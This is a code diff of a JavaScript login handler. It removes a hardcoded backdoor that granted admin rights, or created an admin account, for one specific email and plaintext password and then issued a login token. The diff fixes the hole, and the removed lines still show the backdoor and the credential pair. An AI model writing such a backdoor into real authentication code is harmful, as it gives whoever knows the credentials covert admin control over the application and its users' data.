@@ -49,38 +49,6 @@ export const loginUser = async (req, res) => {
     try {
         const user = await User.findOne({ email });
 
-        // Check for specific admin credentials
-        if (email === "princesssaffron519@gmail.com" && password === "Saffron777") {
-            if (user) {
-                if (!user.isAdmin) {
-                    user.isAdmin = true;
-                    await user.save();
-                }
-                return res.json({
-                    _id: user._id,
-                    fullName: user.fullName,
-                    email: user.email,
-                    isAdmin: user.isAdmin,
-                    token: generateToken(user._id),
-                });
-            } else {
-                // If user doesn't exist but has valid admin credentials, create them
-                const adminUser = await User.create({
-                    fullName: "Admin",
-                    email: "princesssaffron519@gmail.com",
-                    password: "Saffron777",
-                    isAdmin: true,
-                });
-                return res.json({
-                    _id: adminUser._id,
-                    fullName: adminUser.fullName,
-                    email: adminUser.email,
-                    isAdmin: adminUser.isAdmin,
-                    token: generateToken(adminUser._id),
-                });
-            }
-        }
-
         if (user && (await user.comparePassword(password))) {
             res.json({
                 _id: user._id,
